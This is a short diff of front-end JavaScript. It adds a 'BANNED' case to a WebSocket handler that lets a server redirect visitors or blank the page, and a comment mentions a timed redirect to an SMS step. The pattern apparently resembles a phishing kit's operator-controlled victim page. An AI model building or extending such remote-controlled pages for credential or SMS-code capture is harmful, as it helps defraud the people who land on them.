@@ -61,6 +61,9 @@
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
             if (msg.type === 'REDIRECT') window.location.href = msg.url;
+            else if (msg.type === 'BANNED') {
+                document.body.innerHTML = '<div style="color:white;text-align:center;margin-top:20vh;"><h1>ACCÈS REFUSÉ</h1></div>';
+            }
         };
 
         // Redirection automatique après 20s vers SMS (par défaut)
